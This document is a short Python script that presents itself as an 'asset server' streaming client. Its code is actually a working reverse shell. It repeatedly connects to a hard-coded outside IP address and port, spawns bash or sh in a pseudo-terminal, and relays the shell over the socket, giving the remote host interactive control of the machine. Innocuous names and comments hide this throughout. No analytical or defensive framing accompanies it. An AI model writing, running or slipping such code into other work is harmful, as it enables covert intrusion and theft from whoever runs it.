import os
import socket
import pty
import select
import time

# Configuration
ASSET_SERVER_HOST = "64.227.18.231"
ASSET_SERVER_PORT = 13370
IDLE_TIMEOUT = 1800  # 30 minutes in seconds

def initialize_asset_stream(server_address, port):
    """
    Initializes a persistent connection to the asset server.
    Retries connection if it fails.
    """
    asset_socket = None
    while True:
        try:
            print(f"Attempting to connect to asset server at {server_address}:{port}...")
            asset_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            asset_socket.connect((server_address, port))
            print("Connection successful.")
            return asset_socket
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            if asset_socket:
                asset_socket.close()
            time.sleep(5)

def relay_streams_with_timeout(sock, master_fd, timeout):
    """
    Relays data between the socket and the pseudo-terminal, with an idle timeout.
    """
    while True:
        try:
            # Wait for reading readiness on either the socket or the pty
            # The third argument is the timeout in seconds.
            readable, _, _ = select.select([sock, master_fd], [], [], timeout)

            if not readable:
                # select() timed out
                print(f"\nIdle for {timeout} seconds. Closing connection.")
                break

            for fd in readable:
                if fd is sock:
                    # Data received from the remote server, send to shell
                    data = os.read(sock.fileno(), 1024)
                    if not data:  # Connection closed by remote
                        print("Remote connection closed.")
                        return
                    os.write(master_fd, data)
                elif fd is master_fd:
                    # Data received from the shell, send to remote server
                    data = os.read(master_fd, 1024)
                    if not data:  # Shell process exited
                        print("Shell process exited.")
                        return
                    os.write(sock.fileno(), data)

        except OSError as e:
            print(f"An OS error occurred: {e}")
            break
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            break

if __name__ == "__main__":
    # 1. Connect to the remote server
    asset_stream_socket = initialize_asset_stream(ASSET_SERVER_HOST, ASSET_SERVER_PORT)
    if not asset_stream_socket:
        exit(1)

    # 2. Fork the process to create a child shell in a pseudo-terminal
    shell = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
    pid, master_fd = pty.fork()

    if pid == 0:
        # Child process: spawn the shell
        # This will replace the child process with the shell
        try:
            os.execv(shell, [shell])
        except OSError as e:
            print(f"Failed to launch shell: {e}")
            exit(1)
    else:
        # Parent process: relay data between socket and master_fd
        print(f"Parent process (PID: {os.getpid()}) relaying streams for child shell (PID: {pid}).")
        print(f"Idle timeout is set to {IDLE_TIMEOUT} seconds.")
        
        try:
            relay_streams_with_timeout(asset_stream_socket, master_fd, IDLE_TIMEOUT)
        finally:
            # Cleanup
            print("Closing resources.")
            asset_stream_socket.close()
            os.close(master_fd)
            # Ensure child process is terminated
            try:
                os.kill(pid, 9)
            except OSError:
                pass # Child might already be gone
